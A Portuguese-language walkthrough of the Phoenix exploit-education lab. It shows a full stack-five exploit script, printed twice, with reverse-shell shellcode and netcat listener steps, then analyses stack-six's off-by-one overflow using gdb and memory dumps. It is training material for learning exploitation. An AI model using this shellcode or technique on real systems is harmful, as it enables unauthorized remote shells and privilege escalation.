buf += &quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += &quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += &quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += &quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += &quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += &quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# Padding
buf += 'A' * (136 - len(buf))

# ret
buf += '\x81\x04\x40' # Aponta para jmp rax

open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<blockquote>
<p>Eu removi o <strong>b&quot;&quot;</strong> pq tava dando problema :(</p>
</blockquote>
<p>Agora basta gerar o exploit: <code>python /tmp/gerar_exploit.py</code></p>
<p>Abrir um novo terminal: <code>ssh -p 2222 user@localhost</code></p>
<p>Terminal 1: <code>nc -lvnp 4444</code></p>
<p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code> </p>
<p>Agora, no terminal 1 deve ter uma shell :D</p>
<p><img src="stack/phoenix/./img/stack_five/Exploit_working.png" alt="" /></p>
<blockquote>
<p>Dica: <code>bash -ip</code> vai deixar a sua shell mais us√°vel</p>
</blockquote>
<p>Se nos tiv√©ssemos executado o programa como root, a nossa shell teria esses privil√©gios elevados ! :D</p>
<p><img src="stack/phoenix/./img/stack_five/root_exploit.png" alt="" /></p>
<p><code>UID = 0</code> quer dizer que possu√≠mos privil√©gios de root, mesmo que o <code>whoami</code> n√£o tenha dito root</p>
<p>E se o programa estivesse exposto para a rede, poder√≠amos conseguir uma root shell remota :D (spoiler para os pr√≥ximos desafios hehehe)</p>
<hr />
<p>Voc√™ chegou at√© aqui :D</p>
<p>Toma mais um gif de panda como presente</p>
<p><img src="stack/phoenix/./img/panda_slide_0.gif" alt="" /></p>
<h1 id="-solu√ß√£o-5"><a class="header" href="#-solu√ß√£o-5">üí´ Solu√ß√£o</a></h1>
<blockquote>
<p>vim /tmp/gerar_exploit.py</p>
</blockquote>
<pre><code>buf =  &quot;&quot;

# shellcode
buf += &quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += &quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += &quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += &quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += &quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += &quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# Filler
buf += 'A' * (136 - len(buf))

# ret
buf += '\x81\x04\x40' # Aponta para jmp rax

open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<p>Agora basta gerar o exploit: <code>python /tmp/gerar_exploit.py</code></p>
<p>Abrir um novo terminal: <code>ssh -p 2222 user@localhost</code></p>
<p>Terminal 1: <code>nc -lvnp 4444</code></p>
<p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code> </p>
<p>Agora, no terminal 1 deve ter uma shell :D</p>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/phoenix/StackSix.html#-dicas">üí° Dicas</a></li>
<li><a href="stack/phoenix/StackSix.html#-explica%C3%A7%C3%A3o">üõ∏ Explica√ß√£o</a>
<ul>
<li><a href="stack/phoenix/StackSix.html#analisando-o-programa">Analisando o programa</a>
<ul>
<li><a href="stack/phoenix/StackSix.html#main">main</a>
<ul>
<li><a href="stack/phoenix/StackSix.html#dica">Dica</a></li>
</ul>
</li>
<li><a href="stack/phoenix/StackSix.html#greet">greet</a></li>
</ul>
</li>
<li><a href="stack/phoenix/StackSix.html#analisando-o-programa-asm">Analisando o programa (ASM)</a>
<ul>
<li><a href="stack/phoenix/StackSix.html#main-1">main</a></li>
</ul>
</li>
<li><a href="stack/phoenix/StackSix.html#fuzz">Fuzz</a></li>
<li><a href="stack/phoenix/StackSix.html#e-vamos-rodar-com-127-as">E vamos rodar com 127 As:</a>
<ul>
<li><a href="stack/phoenix/StackSix.html#curiosidade">Curiosidade</a></li>
</ul>
</li>
<li><a href="stack/phoenix/StackSix.html#como-ir-de-off-by-one-para-execu%C3%A7%C3%A3o-de-c%C3%B3digo">Como ir de off-by-one para execu√ß√£o de c√≥digo</a>
<ul>
<li><a href="stack/phoenix/StackSix.html#ret-com-um-rbp-corrompido">Ret com um RBP corrompido</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="stack/phoenix/StackSix.html#-exploit">üî• Exploit</a>
<ul>
<li><a href="stack/phoenix/StackSix.html#o-que-controlamos">O que controlamos?</a>
<ul>
<li><a href="stack/phoenix/StackSix.html#setup">Setup</a></li>
<li><a href="stack/phoenix/StackSix.html#descobrir-que-partes-da-memoria-controlamos">Descobrir que partes da memoria controlamos</a></li>
<li><a href="stack/phoenix/StackSix.html#encontrar-para-que-regi%C3%A3o-podemos-apontar-rbp">Encontrar para que regi√£o podemos apontar rbp</a></li>
<li><a href="stack/phoenix/StackSix.html#encontrar-um-pointer-nessa-regi%C3%A3o-que-aponte-para-a-parte-que-controlamos">Encontrar um pointer nessa regi√£o que aponte para a parte que controlamos</a></li>
</ul>
</li>
<li><a href="stack/phoenix/StackSix.html#shellcode">Shellcode</a></li>
</ul>
</li>
<li><a href="stack/phoenix/StackSix.html#-solu%C3%A7%C3%A3o">üí´ Solu√ß√£o</a></li>
</ul>
<h1 id="-dicas-2"><a class="header" href="#-dicas-2">üí° Dicas</a></h1>
<p>Off-by-one BOF</p>
<h1 id="-explica√ß√£o-4"><a class="header" href="#-explica√ß√£o-4">üõ∏ Explica√ß√£o</a></h1>
<p>O programa aceita um nome por meio da env <code>ExploitEducation</code>! Esse nome √© usado para gerar uma mensagem de boas vindas! \ 
Esse processo de gerar as mensagens √© vulner√°vel a buffer overflow!</p>
<h2 id="analisando-o-programa-1"><a class="header" href="#analisando-o-programa-1">Analisando o programa</a></h2>
<h3 id="main"><a class="header" href="#main">main</a></h3>
<pre><code class="language-C">int main(int argc, char **argv) {
  char *ptr;
  printf(&quot;%s\n&quot;, BANNER);

#ifdef NEWARCH
  if (argv[1]) {
    what = argv[1];
  }
#endif

  ptr = getenv(&quot;ExploitEducation&quot;);
  if (NULL == ptr) {
    // This style of comparison prevents issues where you may accidentally
    // type if(ptr = NULL) {}..

    errx(1, &quot;Please specify an environment variable called ExploitEducation&quot;);
  }

  printf(&quot;%s\n&quot;, greet(ptr));
  return 0;
}
</code></pre>
<p>Main come√ßa definindo um pointer (<code>ptr</code>) e printando o banner</p>
<p>Em seguida, faz verifica√ß√µes relacionadas √† arquitetura do sistema usando o diretivo:
<code>#ifdef NEWARCH</code>. O diretivo <code>#ifdef NOME</code> checa se a macro chamada <code>NOME</code> existe.</p>
<p>Isso √© usado para tornar o inicio da mensagem de boas vindas (gerada por <code>greet</code>) ser dependente da arquitetura!</p>
<p>Por isso nos n√£o a encontramos no c√≥digo fonte! Mas caso usemos <code>strings</code> conseguimos encontra-las no bin√°rio:
<img src="stack/phoenix/./img/stack_six/Messages_ARCH.png" alt="Diferen√ßa entre as arquiteturas" /></p>
<p>Em seguida, main salva o valor da env var &quot;ExploitEducation&quot; no pointer ptr</p>
<p>Depois, √© checado se ptr √© NULL (a env var n√£o existe)</p>
<p>Caso n√£o exista: usa a fun√ß√£o errx() para interromper a execu√ß√£o com uma mensagem de erro! errx() recebe 2 argumento: (c√≥digo_do_erro, mensagem_do_erro)</p>
<p>No nosso caso:</p>
<pre><code class="language-C">  ptr = getenv(&quot;ExploitEducation&quot;);
  if (NULL == ptr) {
    errx(1, &quot;Please specify an environment variable called ExploitEducation&quot;);
  }
    // C√≥digo de erro: 1
   // Mensagem de erro: Por favor, especifique uma env var chamada ExploitEducation
</code></pre>
<p>Nos podemos confirmar isso usando: <code>echo $?</code>, que printa o c√≥digo retornado pelo ultimo programa
<img src="stack/phoenix/./img/stack_six/Exit_Codes_errx.png" alt="0 = sem erro, 1 = erro" /></p>
<blockquote>
<p>0 = sem erro, 1 = erro</p>
</blockquote>
<p>por ultimo, <code>greet()</code> √© chamada, e o valor retornado por ela √© printado!</p>
<p>E o programa finaliza retornando <code>0</code> (sem erro)!</p>
<h4 id="dica"><a class="header" href="#dica">Dica</a></h4>
<p>Para definir uma env var no gdb</p>
<p><img src="stack/phoenix/./img/stack_six/Exit_Codes_gdb.png" alt="set environment ExploitEducation=ABC" /></p>
<blockquote>
<p>set environment ExploitEducation=ABC</p>
</blockquote>
<h3 id="greet"><a class="header" href="#greet">greet</a></h3>
<pre><code class="language-C">char *greet(char *who) { // who = nome da pessoa
  char buffer[128];
  int maxSize;

  maxSize = strlen(who);
  if (maxSize &gt; (sizeof(buffer) - /* garantir termina√ß√£o com null */ 1)) {
    maxSize = sizeof(buffer) - 1;
  }

  strcpy(buffer, what);			// Inicio da mensagem de boas vindas
  strncpy(buffer + strlen(buffer), who, maxSize);

  return strdup(buffer);
}
</code></pre>
<p>Agora chega a parte vulner√°vel! D:</p>
<p>A fun√ß√£o <code>greet</code> recebe um argumento: &quot;who&quot; (quem recebe a mensagem de boas vindas)</p>
<p>S√£o definidas duas vari√°veis locais: <code>buffer[128]</code> e <code>maxSize</code> (tamanho m√°ximo)</p>
<p>O tamanho de <code>who</code> √© salvo em <code>maxSize</code></p>
<blockquote>
<p>Lembrete: Buffers s√£o terminados com um NULL byte, portanto um buffer[128] s√≥ armazena 127 letras!</p>
</blockquote>
<p>Em seguida, √© checado se <code>maxSize</code> √© maior que o <code>tamanho(buffer) - 1</code> (-1 por causa no null byte final)</p>
<p>Caso seja maior, <code>maxSize</code> vai ser definido como o <code>tamanho(buffer) - 1</code> (maxSize = 127)</p>
<blockquote>
<p>Portando, o limite de maxSize √© 127</p>
</blockquote>
<p>Essa √© uma tentativa de prevenir o buffer overflow! Pois, s√≥ seriam copiados 127 bytes, impedindo o overflow D:</p>
<p>Mas aqui que entra o problema: essa contagem n√£o leva em considera√ß√£o o inicio da mensagem (<code>what</code>)! Aquele que era dependente da arquitetura :D</p>
<p>Ent√£o nos vamos acabar escrevendo fora do buffer! Aqui esta a parte do c√≥digo que causa a vulnerabilidade</p>
<pre><code class="language-C">strcpy(buffer, what); // what = inicio da mensagem
strncpy(buffer, who, maxSize); // who = o valor de ExploitEducation! Quem recebe o oi :D
</code></pre>
<p>Nos ja sabemos como o <code>strcpy</code> funciona (voc√™ passa um buffer como alvo e o que vamos salvar nele, ignorando tamanho! 
Caso nos consegu√≠ssemos controlar what, poder√≠amos facilmente exploitar o programa)</p>
<p>str <strong>N</strong> cpy (<code>strncpy</code>) √© similar a <code>strcpy</code>, mas recebe um terceiro par√¢metro: tamanho!</p>
<p>Esse tamanho √© limitado √† 127 (limite de <code>maxSize</code>), ent√£o teoricamente n√£o seria exploitavel :(</p>
<p><strong>Mas espera ai, ja tinha coisa naquele buffer!!! O inicio da mensagem!!!</strong></p>
<p>O tamanho do inicio √© 34 bytes (na vers√£o amd64)</p>
<pre><code class="language-python">$ python3
&gt;&gt;&gt; x = &quot;Welcome, I am pleased to meet you &quot;
&gt;&gt;&gt; len(x)
34
</code></pre>
<p>Isso quer dizer que no buffer cabem 128, mas foram colocados <strong>34 + 127</strong>: Overflow!</p>
<p>Ent√£o se n√£o fosse pelo inicio da mensagem, n√£o seria exploitavel :D</p>
<p>Uma maneira de concertar essa vulnerabilidade seria: <code>strncpy(buffer, who, maxSize - sizeof(buffer))</code> (subtrair o tamanho atual)</p>
<h2 id="analisando-o-programa-asm"><a class="header" href="#analisando-o-programa-asm">Analisando o programa (ASM)</a></h2>
<h3 id="main-1"><a class="header" href="#main-1">main</a></h3>
<pre><code class="language-x86asm">gef&gt; disassemble main
push   rbp
mov    rbp,rsp                    ; Prologo
sub    rsp,0x20


mov    DWORD PTR [rbp-0x14],edi
mov    QWORD PTR [rbp-0x20],rsi
mov    edi,0x400878
call   0x400530 &lt;puts@plt&gt;        ; printar o banner


mov    edi,0x4008c2               ; o 1¬∫ argumento √© &quot;ExploitEducation&quot;
call   0x400520 &lt;getenv@plt&gt;      ; Le as env vars e coloca &quot;ExploitEducation&quot; em rax


mov    QWORD PTR [rbp-0x8],rax    ; Pointer para rax
cmp    QWORD PTR [rbp-0x8],0x0    ; Compara esse pointer com 0x0 
                                  ; (Teoricamente &quot;cmp rax, 0x0&quot; tamb√©m deveria funcionar,
                                  ; mas salvando nesse pointer, podemos usar o valor depois)

jne    0x4007dd &lt;main+66&gt;         ; Jump not equal (pular se a compara√ß√£o anterior for diferente)
                                  ; Mas pular para onde? Para main+66 (logo depois da mensagem de erro)
                                  ; Ou melhor: Caso ExploitEducation esteja definida, nos n√£o emitimos erro

Essa parte s√≥ executa caso ExploitEducation n√£o exista {
        mov    esi,0x4008d8               ; 2¬∫ argumento
        mov    edi,0x1                    ; 1¬∫ argumento
        mov    eax,0x0                    ; Valor retornado por main
        call   0x400540 &lt;errx@plt&gt;        ; Interrompe a execu√ß√£o e sai com erro
}



        0x4007dd &lt;main+66&gt;:
mov    rax,QWORD PTR [rbp-0x8]      ; Lembra daquele pointer que salvamos com o rax de getenv() ? 
                                    ; Coloca ele em rax de novo :D

mov    rdi,rax                      ; 1¬∫ argumento: rax (o valor da env ExploitEducation)
call   0x4006fd &lt;greet&gt;             ; Chama greet()
   
mov    rdi,rax                      ; 1¬∫ argumento: O valor que greet retornou (salvo em rax)
call   0x400530 &lt;puts@plt&gt;          ; Printa a mensagem de boas vindas para o terminal
   
   
mov    eax,0x0                      ; Valor retornado por main: 0 (sem erro)
leave                               ; Epilogo
ret    
</code></pre>
<p>N√£o √© t√£o relevante analisar o assembly de greet para entender a vulnerabilidade, dado que temos o c√≥digo fonte!</p>
<p>Mas caso queira, voc√™ pode analisar por conta pr√≥pria e relacionar o ASM com o c√≥digo fonte por treino :D</p>
<h2 id="fuzz"><a class="header" href="#fuzz">Fuzz</a></h2>
<p>Agora que sabemos que √© poss√≠vel realizar o overflow, vamos ver o que √© corrompido :D</p>
<p>Nos s√≥ podemos colocar 127 no bytes no input, pois se colocarmos mais o programa simplesmente vai remove-los: ent√£o <strong>colocar 127 ou 200 teria o mesmo efeito!</strong> :)</p>
<p>Primeiro, vamos encontrar aonde colocaremos nossos breakpoints</p>
<pre><code class="language-x86asm">gef&gt; disassemble greet 
Dump of assembler code for function greet:
   0x00000000004006fd &lt;+0&gt;:	push   rbp
   0x00000000004006fe &lt;+1&gt;:	mov    rbp,rsp		&lt;---
   0x0000000000400701 &lt;+4&gt;:	push   rbx
   0x0000000000400702 &lt;+5&gt;:	sub    rsp,0xa8
.......
.......
   0x0000000000400798 &lt;+155&gt;:	pop    rbx
   0x0000000000400799 &lt;+156&gt;:	pop    rbp		&lt;---
   0x000000000040079a &lt;+157&gt;:	ret    
End of assembler dump
</code></pre>
<p>Vamos colocar uma no inicio de greet e uma no final! :D</p>
<pre><code class="language-x86asm">gef&gt; b *0x4006fe 
Breakpoint 1 at 0x4006fe

gef&gt; b *0x40079a
Breakpoint 2 at 0x40079a
</code></pre>
<h2 id="e-vamos-rodar-com-127-as"><a class="header" href="#e-vamos-rodar-com-127-as">E vamos rodar com 127 As:</a></h2>
<p>Obs: </p>
<blockquote>
<p>gef&gt; set environment ExploitEducation=$(python -c &quot;print 'A' * 127&quot;)</p>
</blockquote>
<p>Deve ria funcionar, mas n√£o funciona sei la por que :(</p>
<p>Ent√£o eu rodei em outro terminal!</p>
<blockquote>
<p>python -c &quot;print 'A' * 127&quot;</p>
</blockquote>
<p>E dei Ctrl+shift+C Ctrl+shift+V</p>
<blockquote>
<p>gef&gt; set environment ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p>
</blockquote>
<p>eita, overflow no tutorial XD ! O computador ta se revoltando!! </p>
<p>Agora, vamos rodar o programa <code>r</code>. Quando ele chegar no <code>breakpoint 1</code> (inicio de greet), pode <code>analisar o frame</code> e ver <code>aonde o rbp de main foi salvo</code>!</p>
<pre><code class="language-x86asm">gef&gt; info frame
Stack level 0, frame at 0x7fffffffe590:
 rip = 0x4006fe in greet; saved rip = 0x4007e9
 called by frame at 0x7fffffffe5c0
 Arglist at 0x7fffffffe580, args: 
 Locals at 0x7fffffffe580, Previous frame's sp is 0x7fffffffe590
 Saved registers:
  rbp at 0x7fffffffe580, rip at 0x7fffffffe588                            &lt;- aqui
</code></pre>
<p>Agora que nos sabemos o endere√ßo de RIP e RBP, podemos checar seu valores:</p>
<pre><code class="language-x86asm">endere√ßo: valor

gef&gt; x/xg 0x7fffffffe580            -&gt; rbp
0x7fffffffe580:	0x00007fffffffe5b0
gef&gt; x/xg 0x7fffffffe588            -&gt; rip
0x7fffffffe588:	0x00000000004007e9
</code></pre>
<blockquote>
<p>Obs: o /xg √© s√≥ para a formata√ß√£o ficar leg√≠vel! Significa e<strong>X</strong>tra <strong>G</strong>rande (que √© o tamanho do pointer na arquitetura amd64)!</p>
</blockquote>
<p>Isso quer dizer que no inicio de greet, os valores do RIP e RBP salvos na stack s√£o: <code>0x00000000004007e9</code> e <code>0x00007fffffffe5b0</code></p>
<p>Agora vamos continuar a execu√ß√£o <code>c</code>, e ver se eles se alteram (lembrando greet √© vulner√°vel)!</p>
<pre><code class="language-x86asm">gef&gt; c
---- output do gef ----
gef&gt; x/xg 0x7fffffffe580             -&gt; rbp
0x7fffffffe580:	0x00007fffffffe541
gef&gt; x/xg 0x7fffffffe588             -&gt; rip
0x7fffffffe588:	0x00000000004007e9
</code></pre>
<p>Eita! RBP foi alterado D:</p>
<blockquote>
<p>0x00007fffffffe5<strong>b0</strong> ---&gt;  0x00007fffffffe5<strong>41</strong></p>
</blockquote>
<p>Isso quer dizer que n√≥s conseguimos controlar o √∫ltimos byte do rbp salvo! Esse ultimo byte constuma ser 
chamado de <code>LSB</code> (Least Significant Byte, Byte menos significante)</p>
<p>Assim, quer dizer que esse buffer overflow √© um <code>BoF</code> que corrompe o <code>LSB</code>, ou como √© mais conhecido: <strong>off-by-one</strong> (errado por um)!</p>
<p>Esse tipo de buffer overflow √© bem comum: v√£o esquecer de que o buffer termina com um <code>0x00</code> e v√£o comparar o <code>input</code> com o <code>tamanho do buffer</code>,
ao eves do <code>tamanho do buffer - 1</code>. Assim, permitindo que seja escrito 1 byte fora do buffer!</p>
<h4 id="curiosidade"><a class="header" href="#curiosidade">Curiosidade</a></h4>
<p>Lembra que o texto no inicio do buffer varia de arquitetura para arquitetura? Isso acontece pois cada uma aloca as vari√°veis em uma posi√ß√£o,
otimizam de maneira diferente, etcetc!</p>
<p>Muitas vezes um <strong>off-by-one</strong> n√£o vai ser exploitavel, pois o byte que vem logo depois do buffer n√£o necessariamente √© o rbp! 
E esse √© o nosso caso: existem outras vari√°veis dentro de greet!</p>
<p>Assim, quem desenvolveu o desafio nos fez o favor de colocar essa mensagem no inicio para compensar esse espa√ßo!</p>
<p>Caso a mensagem fosse 1 byte maior, poder√≠amos controlar 2 bytes do rbp! Caso a mensagem fosse 1 byte MENOR, n√£o conseguir√≠amos controlar o rbp! </p>
<p>E caso a mensagem fosse 4 bytes a mais, como voc√™ pode imaginar, poder√≠amos controlar o RIP :D</p>
<p>...</p>
<p>E caso o programa nem cheque o input? Ai facilita bastante pra gente hehe :D ! √â o caso do desafio passado!</p>
<p>Assim, esse desafio foi feito de uma maneira que v√° nos ensinar como exploitar um <strong>off-by-one</strong> que nos da <strong>execu√ß√£o de c√≥digo</strong></p>
<p>Na vida real, caso n√£o existisse essa mensagem, s√≥ conseguir√≠amos exploitar esse off-by-one caso o nosso buffer estivesse adjacente ao rbp, 
isto √©: n√£o existe nenhuma outra vari√°vel, ou o buffer foi alocado na parte mais baixa da stack(Do lado do RBP)!</p>
<pre><code>Nesse caso, n√≥s nao conseguir√≠amos alterar RBP nem RIP,
portanto seria imposs√≠vel conseguir execu√ß√£o de c√≥digo :(

O m√°ximo que conseguimos fazer √© corromper 1 byte de uma vari√°vel!
._ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _  _ .
|    buffer      |   outras vari√°veis     | RBP | RIP | 
|_ _ _ _ _ _ _ _ |_ _ _ _ _ _ _ _ _ _ _ _ |_ _ _|_ _ _|

O impacto disso varia muito: n√£o acontecer nada (mais comum), 
fazer o programa crashar, ou alterar um valor importante 
(por exemplo, aquela vari√°vel poderia armazenar o seu saldo do banco hehe ;) )...
</code></pre>
<h2 id="como-ir-de-off-by-one-para-execu√ß√£o-de-c√≥digo"><a class="header" href="#como-ir-de-off-by-one-para-execu√ß√£o-de-c√≥digo">Como ir de off-by-one para execu√ß√£o de c√≥digo</a></h2>
<p>Quando <code>main</code> chama <code>call greet</code>, ela <code>salva o seu rbp e rip</code> na stack!</p>
<p>Ent√£o esse rbp que estamos alterando √© o <code>rbp de main</code>!</p>
<p>Quando greet retorna, main fica com o rbp errado!</p>
<p>Main vai ir ate o final da sua execu√ß√£o normalmente, na sua ultima instru√ß√£o (<code>ret</code>) a magica acontece</p>
<h3 id="ret-com-um-rbp-corrompido"><a class="header" href="#ret-com-um-rbp-corrompido">Ret com um RBP corrompido</a></h3>
<p>resumindo, ret √© um: <code>mov rsp rbp</code> (descer o rsp), <code>pop rbp</code> (desce o rsp 8 bytes (a stack diminui para valores maiores, ent√£o +8)), e <code>pop rip</code></p>
<p>Assim, caso mudemos o rbp para, por exemplo: 0x1234<strong>56</strong>, quando main retornar, o valor de 0x1234<strong>56</strong> vai para o rbp e o de 0x1234<strong>64</strong> (+8) para o rip</p>
<p>Portanto, precisamos achar um valor para colocar no rip que va apontar para c√≥digo que controlamos, e apontar rbp para esse endere√ßo <strong>-</strong> 8 :D</p>
<p>Ent√£o caso o pointer que precisamos esteja em 0x123456<strong>78</strong> e nos possamos controlar o ultimo byte do <code>rbp</code>: vamos colocar 0x123456<strong>70</strong> (-8) no <code>rbp</code>! 
E quando main retornar, o <code>valor salvo</code> em 0x123456<strong>78</strong> vai para o <code>rip</code> !</p>
<p>E se nos controlamos RIP, controlamos a execu√ß√£o :D</p>
<h1 id="-exploit-3"><a class="header" href="#-exploit-3">üî• Exploit</a></h1>
<p>Agora que sabemos o tipo de exploit que precisamos escrever, basta seguir os passos a seguir:</p>
<ol>
<li>Descobrir que partes da memoria controlamos</li>
<li>Encontrar para que regi√£o podemos apontar rbp</li>
<li>Encontrar um pointer nessa regi√£o que aponte para a parte que controlamos</li>
</ol>
<h2 id="o-que-controlamos"><a class="header" href="#o-que-controlamos">O que controlamos?</a></h2>
<p>Normalmente, nos controlamos o input e as env vars, nesse caso o input √© passado pelas env vars... portanto podemos falar que a unica regi√£o da memoria que
controlamos s√£o as env vars</p>
<p>E qual √© essa regi√£o? Vamos encontrar :D</p>
<h3 id="setup"><a class="header" href="#setup">Setup</a></h3>
<p>As envs s√£o diferentes dentro do gdb, n√≥s podemos comparar usando </p>
<pre><code>Fora do gdb: env
Dentro do dbg: show environment
</code></pre>
<p>A diferen√ßa √©: gdb adiciona <code>LINES</code> e <code>COLUMNS</code>. E altera <code>_</code> (o programa sendo executando nesse momento, esta definido como &quot;/usr/local/bin/gdb&quot;)</p>
<pre><code class="language-diff">user@phoenix-amd64$ diff /tmp/gdb /tmp/env
16,18c16
&lt; _=/usr/local/bin/gdb
&lt; LINES=33
&lt; COLUMNS=168
---
&gt; _=/usr/bin/env
</code></pre>
<p>Para concertar essa diferen√ßa, e garantir que todos endere√ßos est√£o certos, basta executar dentro do gdb:</p>
<pre><code>unset environment COLUMNS
unset environment LINES
set environment _=/opt/phoenix/amd64/stack-six

&gt; Aviso: Se voc√™ sair do gdb elas v√£o resetar!
</code></pre>
<h3 id="descobrir-que-partes-da-memoria-controlamos"><a class="header" href="#descobrir-que-partes-da-memoria-controlamos">Descobrir que partes da memoria controlamos</a></h3>
<p>Colocando um breakpoint no inicio de main (<code>b *main</code>), vamos encontrar registers apontando para envs!
<img src="stack/phoenix/./img/stack_six/envs_gef.png" alt="" /></p>
<p>Escolhendo o menor endere√ßo e printando!</p>
<p><img src="stack/phoenix/./img/stack_six/envs_addr.png" alt="" /></p>
<blockquote>
<p>Dica: vale a pena conferir se aquele realmente √© o inicio das envs, no nosso caso √© :D</p>
</blockquote>
<p><img src="stack/phoenix/./img/stack_six/envs_addr2.png" alt="" /></p>
<p>Isso quer dizer que as envs est√£o de: 0x7fffffff<strong>e817</strong> (inclusivo) a 0x7fffffff<strong>eff8</strong> (exclusivo)</p>
<h3 id="encontrar-para-que-regi√£o-podemos-apontar-rbp"><a class="header" href="#encontrar-para-que-regi√£o-podemos-apontar-rbp">Encontrar para que regi√£o podemos apontar rbp</a></h3>
<p>Nesse caso √© f√°cil ne? Se n√≥s s√≥ podemos alterar o LSB, podemos alterar o RBP: de 0x00007fffffffe5<strong>00</strong> (inclusivo) a 0x00007fffffffe5<strong>ff</strong> (inclusivo)</p>
<h3 id="encontrar-um-pointer-nessa-regi√£o-que-aponte-para-a-parte-que-controlamos"><a class="header" href="#encontrar-um-pointer-nessa-regi√£o-que-aponte-para-a-parte-que-controlamos">Encontrar um pointer nessa regi√£o que aponte para a parte que controlamos</a></h3>
<p>Agora vamos usar uma utilidade do gef chamada <code>memwatch</code>! Sempre que o gef printar aquele output gigante, vai adicionar a regi√£o da memoria especificada!
Voce vai estar &quot;assistindo&quot; aquela regi√£o da memoria! :D</p>
<p>Nos vamos executar <code>gef&gt; memory watch 0x00007fffffffe500 32 qword</code></p>
<blockquote>
<p>Uma qword s√£o 8 bytes, assim, 32 qwords s√£o 256 bytes</p>
</blockquote>
<p>Agora, vamos ver quando main retorna, o que tem nessa regi√£o</p>
<pre><code class="language-x86asm">gef&gt; disassemble main
Dump of assembler code for function main:
....
   0x00000000004007f6 &lt;+91&gt;:	leave  
   0x00000000004007f7 &lt;+92&gt;:	ret

gef&gt; b *0x00000000004007f7
</code></pre>
<p>Agora basta executar o programa ate chegar la (obs, se voce ainda ta naquele breakpoint de main, basta continuar (<code>c</code>))</p>
<p><img src="stack/phoenix/./img/stack_six/memwatch.png" alt="memwatch" /></p>
<p>Eita, bastante coisa!</p>
<p>Agora, entre esses endere√ßos, precisamos encontrar um que tenha um <strong>pointer que aponte para a regi√£o da memoria que controlamos!</strong></p>
<p>Pra facilitar isso, eu vou jogar todo o output do <code>memwatch</code> em um arquivo e usar <code>grep</code></p>
<p>Todos os endere√ßos da regi√£o que controlamos come√ßam com <code>0x7fffffff</code>, ent√£o esse ja √© um bom come√ßo</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | grep &quot;0x00007fffffff&quot;
0x00007fffffffe500‚îÇ+0x0000 0x0000000000000001
0x00007fffffffe508‚îÇ+0x0008 0x00007ffff7db6d0f
0x00007fffffffe510‚îÇ+0x0010 0x00007ffff7ffc948
0x00007fffffffe518‚îÇ+0x0018 0x00000000000000a6
0x00007fffffffe520‚îÇ+0x0020 0x00007fffffffe57f
0x00007fffffffe528‚îÇ+0x0028 0x0000000000000001
0x00007fffffffe530‚îÇ+0x0030 0x4141414141414141
0x00007fffffffe538‚îÇ+0x0038 0x00007ffff7ffb300
0x00007fffffffe540‚îÇ+0x0040 0x0000000000000000
0x00007fffffffe548‚îÇ+0x0048 0x0000000000600c00
0x00007fffffffe550‚îÇ+0x0050 0x000000000040079b
0x00007fffffffe558‚îÇ+0x0058 0x0000000000000000
...
...
...
</code></pre>
<p>Isso reduz bastante, mas ainda n√£o o suficiente: a gente precisa de <code>0x00007fffffff</code> no valor, e n√£o no endere√ßo</p>
<p>Para isso, podemos usar cut! Usando cut antes do grep nos estamos s√≥ levando os valores em considera√ß√£o! Para facilitar, tamb√©m podemos deixa-los em ordem crescente (sort)!</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | cut -d &quot; &quot; -f 2 | grep &quot;0x00007fffffff&quot; | sort
0x00007fffffffe541
0x00007fffffffe57f
0x00007fffffffe620
0x00007fffffffe628
0x00007fffffffe638
0x00007fffffffef10
</code></pre>
<p>as envs est√£o de: 0x7fffffff<strong>e817</strong> (inclusivo) a 0x7fffffff<strong>eff8</strong> (exclusivo)</p>
<p>O √∫nico valor valido √© <strong>0x00007fffffffef10</strong>, pois todos os outros s√£o menores que 0x00007fffffff<strong>e817</strong> !</p>
<p>Agora, basta achar o endere√ßo desse pointer! Portanto vamos tirar o cut :D</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | grep &quot;0x00007fffffffef10&quot;                     
0x00007fffffffe5c8‚îÇ+0x00c8 0x00007fffffffef10
</code></pre>
<p>Porem, ainda tem um detalhe! Nos n√£o queremos esse endere√ßo no rbp! Nos queremos ele no rip!</p>
<p>Assim, nos vamos apontar RBP para o item de cima da lista! Ai quando main retornar (<code>pop rip</code>) o valor vai ser o correto!</p>
<p><img src="stack/phoenix/./img/stack_six/addr_rbp.png" alt="" /></p>
<p>Lembrando que, quando uma fun√ß√£o retorna, o endere√ßo 8 bytes maior que rbp, √© onde o rip esta! Ent√£o por definir <code>rbp = 0x00007fffffffe5c0</code>, nos 
